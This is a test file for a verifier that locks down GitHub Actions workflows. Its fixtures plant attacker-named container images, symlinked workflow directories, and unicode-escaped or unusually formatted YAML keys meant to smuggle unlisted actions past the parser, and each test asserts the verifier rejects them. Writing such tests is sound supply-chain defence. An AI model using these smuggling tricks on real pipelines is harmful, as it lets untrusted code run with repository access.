test('fails closed for runtime, content, or mutable workflow drift', () => {
  const state = fixture();
  writeFileSync(join(state.root, 'packs', 'base', 'pack.json'), '{"id":"changed"}\n');
  writeFileSync(
    join(state.root, '.github', 'workflows', 'v4-gates.yml'),
    '- uses: actions/checkout@v6\n',
  );

  const result = verifyFixture(state, { runtimeVersion: 'v24.18.0' });

  assert.equal(result.result, 'FAILED');
  assert.match(result.errors.join('\n'), /Node runtime|base pack|actions\/checkout/i);
});

test('scans every workflow yml and yaml file and rejects unlisted remote actions', () => {
  const state = fixture();
  writeFileSync(
    join(state.root, '.github', 'workflows', 'unlisted.yaml'),
    `steps:\n  - uses: unexpected/remote-action@${OTHER_SHA}\n`,
  );

  const result = verifyFixture(state);

  assert.equal(result.result, 'FAILED');
  assert.match(result.errors.join('\n'), /unlisted remote action unexpected\/remote-action/);
  assert.match(result.errors.join('\n'), /\.github\/workflows\/unlisted\.yaml/);
});

test('rejects a second shell-only workflow', () => {
  const state = fixture();
  writeFileSync(
    join(state.root, '.github', 'workflows', 'shell-only.yml'),
    'steps:\n  - run: echo unverified\n',
  );

  const result = verifyFixture(state);

  assert.equal(result.result, 'FAILED', result.errors.join('\n'));
  assert.match(result.errors.join('\n'), /workflow file is not permitted: \.github\/workflows\/shell-only\.yml/);
});

test('rejects a second empty workflow', () => {
  const state = fixture();
  writeFileSync(join(state.root, '.github', 'workflows', 'empty.yml'), '');

  const result = verifyFixture(state);

  assert.equal(result.result, 'FAILED', result.errors.join('\n'));
  assert.match(result.errors.join('\n'), /workflow file is not permitted: \.github\/workflows\/empty\.yml/);
});

test('rejects a second minimal top-level yaml workflow', () => {
  const state = fixture();
  writeFileSync(join(state.root, '.github', 'workflows', 'minimal.yaml'), 'name: minimal\n');

  const result = verifyFixture(state);

  assert.equal(result.result, 'FAILED', result.errors.join('\n'));
  assert.match(result.errors.join('\n'), /workflow file is not permitted: \.github\/workflows\/minimal\.yaml/);
});

test('rejects a nested yaml workflow', () => {
  const state = fixture();
  mkdirSync(join(state.root, '.github', 'workflows', 'nested'));
  writeFileSync(join(state.root, '.github', 'workflows', 'nested', 'minimal.yaml'), 'name: nested\n');

  const result = verifyFixture(state);

  assert.equal(result.result, 'FAILED', result.errors.join('\n'));
  assert.match(result.errors.join('\n'), /workflow file is not permitted: \.github\/workflows\/nested\/minimal\.yaml/);
});

test('rejects the canonical workflow when it is a repo-internal symlink', () => {
  const state = fixture();
  const workflowPath = join(state.root, '.github', 'workflows', 'v4-gates.yml');
  writeFileSync(join(state.root, 'workflow-target.yml'), CANONICAL_WORKFLOW);
  unlinkSync(workflowPath);
  symlinkSync('../../workflow-target.yml', workflowPath);

  const result = verifyFixture(state);

  assert.equal(result.result, 'FAILED', result.errors.join('\n'));
  assert.match(result.errors.join('\n'), /v4-gates\.yml must be a regular repo-internal file, not a symlink/);
});

test('rejects an additional yaml symlink to the canonical workflow', () => {
  const state = fixture();
  symlinkSync('v4-gates.yml', join(state.root, '.github', 'workflows', 'alias.yaml'));

  const result = verifyFixture(state);

  assert.equal(result.result, 'FAILED', result.errors.join('\n'));
  assert.match(result.errors.join('\n'), /alias\.yaml must be a regular repo-internal file, not a symlink/);
});

test('rejects a nested workflow directory symlink with a hidden yaml file', () => {
  const state = fixture();
  mkdirSync(join(state.root, 'workflow-target'));
  writeFileSync(join(state.root, 'workflow-target', 'hidden.yaml'), 'name: hidden\n');
  symlinkSync('../../workflow-target', join(state.root, '.github', 'workflows', 'nested'));

  const result = verifyFixture(state);

  assert.equal(result.result, 'FAILED', result.errors.join('\n'));
  assert.match(result.errors.join('\n'), /\.github\/workflows\/nested must be a regular repo-internal file, not a symlink/);
});

test('rejects the workflows directory when it is a repo-internal symlink alias', () => {
  const state = fixture();
  const workflowsRoot = join(state.root, '.github', 'workflows');
  renameSync(workflowsRoot, join(state.root, '.github', 'workflow-target'));
  symlinkSync('workflow-target', workflowsRoot);

  const result = verifyFixture(state);

  assert.equal(result.result, 'FAILED', result.errors.join('\n'));
  assert.match(result.errors.join('\n'), /\.github\/workflows must be a regular repo-internal directory, not a symlink/);
});

test('rejects the .github parent directory when it is a repo-internal symlink alias', () => {
  const state = fixture();
  const githubRoot = join(state.root, '.github');
  renameSync(githubRoot, join(state.root, 'github-target'));
  symlinkSync('github-target', githubRoot);

  const result = verifyFixture(state);

  assert.equal(result.result, 'FAILED', result.errors.join('\n'));
  assert.match(result.errors.join('\n'), /\.github must be a regular repo-internal directory, not a symlink/);
});

test('rejects every mismatching duplicate even when another invocation is correct', () => {
  const state = fixture();
  writeFileSync(
    join(state.root, '.github', 'workflows', 'duplicates.yml'),
    [
      `- uses: actions/checkout@${CHECKOUT_SHA}`,
      '- uses: actions/checkout@v6',
      `- uses: actions/checkout@${OTHER_SHA}`,
      '',
    ].join('\n'),
  );

  const result = verifyFixture(state);
  const mismatches = result.errors.filter(error => error.includes('actions/checkout pin mismatch'));

  assert.equal(result.result, 'FAILED');
  assert.equal(mismatches.length, 2, result.errors.join('\n'));
  assert.match(mismatches[0], /duplicates\.yml/);
  assert.match(mismatches[1], /duplicates\.yml/);
});

test('rejects local actions instead of trusting nested composite or Docker dependencies', () => {
  const state = fixture();
  mkdirSync(join(state.root, '.github', 'actions', 'wrapper'), { recursive: true });
  writeFileSync(
    join(state.root, '.github', 'workflows', 'v4-gates.yml'),
    [
      'steps:',
      `  - uses: actions/checkout@${CHECKOUT_SHA}`,
      '  - uses: ./.github/actions/wrapper',
      '',
    ].join('\n'),
  );
  writeFileSync(
    join(state.root, '.github', 'actions', 'wrapper', 'action.yml'),
    [
      'name: wrapper',
      'runs:',
      '  using: composite',
      '  steps:',
      '    - uses: unexpected/remote-action@main',
      '',
    ].join('\n'),
  );

  const result = verifyFixture(state);

  assert.equal(result.result, 'FAILED');
  assert.match(result.errors.join('\n'), /local actions are not permitted.*\.\/\.github\/actions\/wrapper/i);
});

test('rejects flow-style uses mappings that the canonical parser cannot verify', () => {
  const state = fixture();
  writeFileSync(
    join(state.root, '.github', 'workflows', 'v4-gates.yml'),
    [
      'steps:',
      `  - uses: actions/checkout@${CHECKOUT_SHA}`,
      '  - { uses: unexpected/flow-action@main }',
      '',
    ].join('\n'),
  );

  const result = verifyFixture(state);

  assert.equal(result.result, 'FAILED');
  assert.match(result.errors.join('\n'), /unsupported uses syntax.*v4-gates\.yml/i);
});

test('rejects quoted uses keys that the canonical parser cannot verify', () => {
  const state = fixture();
  writeFileSync(
    join(state.root, '.github', 'workflows', 'v4-gates.yml'),
    [
      'steps:',
      `  - uses: actions/checkout@${CHECKOUT_SHA}`,
      `  - "uses": "unexpected/quoted-action@main"`,
      '',
    ].join('\n'),
  );

  const result = verifyFixture(state);

  assert.equal(result.result, 'FAILED');
  assert.match(result.errors.join('\n'), /unsupported uses syntax.*v4-gates\.yml/i);
});

test('rejects an escaped YAML key that parses to uses', () => {
  const state = fixture();
  const escapedMapping = '{"us\\u0065s":"unexpected/escaped-action@main"}';
  assert.equal(JSON.parse(escapedMapping).uses, 'unexpected/escaped-action@main');
  writeFileSync(
    join(state.root, '.github', 'workflows', 'v4-gates.yml'),
    [
      'steps:',
      `  - uses: actions/checkout@${CHECKOUT_SHA}`,
      `  - ${escapedMapping}`,
      '',
    ].join('\n'),
  );

  const result = verifyFixture(state);

  assert.equal(result.result, 'FAILED');
  assert.match(result.errors.join('\n'), /unsupported workflow key syntax.*v4-gates\.yml/i);
});

test('rejects explicit YAML mapping keys instead of resolving ambiguous action keys', () => {
  const state = fixture();
  writeFileSync(
    join(state.root, '.github', 'workflows', 'v4-gates.yml'),
    [
      'steps:',
      `  - uses: actions/checkout@${CHECKOUT_SHA}`,
      '  - ? uses',
      '    : unexpected/explicit-action@main',
      '',
    ].join('\n'),
  );

  const result = verifyFixture(state);

  assert.equal(result.result, 'FAILED');
  assert.match(result.errors.join('\n'), /unsupported workflow key syntax.*v4-gates\.yml/i);
});

test('rejects block and flow workflow container or service image keys', () => {
  const state = fixture();
  writeFileSync(
    join(state.root, '.github', 'workflows', 'v4-gates.yml'),
    [
      'steps:',
      `  - uses: actions/checkout@${CHECKOUT_SHA}`,
      'container: attacker/block:latest',
      'services:',
      '  db:',
      '    image: attacker/service:latest',
      'runtime: { container: attacker/flow:latest, services: { db: { image: attacker/flow-service:latest } } }',
      '',
    ].join('\n'),
  );

  const result = verifyFixture(state);

  assert.equal(result.result, 'FAILED');
  assert.match(result.errors.join('\n'), /workflow runtime key container is not permitted/);
  assert.match(result.errors.join('\n'), /workflow runtime key services is not permitted/);
  assert.match(result.errors.join('\n'), /workflow runtime key image is not permitted/);
  assert.ok(result.workflowPolicy.forbiddenRuntimeKeys.length >= 6);
});

test('rejects escaped container keys that valid JSON parsing resolves', () => {
  const state = fixture();
  const escapedMapping = '{"cont\\u0061iner":"attacker/escaped:latest"}';
  assert.equal(JSON.parse(escapedMapping).container, 'attacker/escaped:latest');
  writeFileSync(
    join(state.root, '.github', 'workflows', 'v4-gates.yml'),
    [
      'steps:',
      `  - uses: actions/checkout@${CHECKOUT_SHA}`,
      `runtime: ${escapedMapping}`,
      '',
    ].join('\n'),
  );

  const result = verifyFixture(state);

  assert.equal(result.result, 'FAILED');
  assert.match(result.errors.join('\n'), /unsupported workflow key syntax.*v4-gates\.yml/i);
});

test('verifies the integrated repository dependency boundary', () => {
  const root = join(import.meta.dirname, '..', '..');
  const result = verifyControlDependencies(root);

  assert.equal(result.result, 'PASSED', result.errors.join('\n'));
});
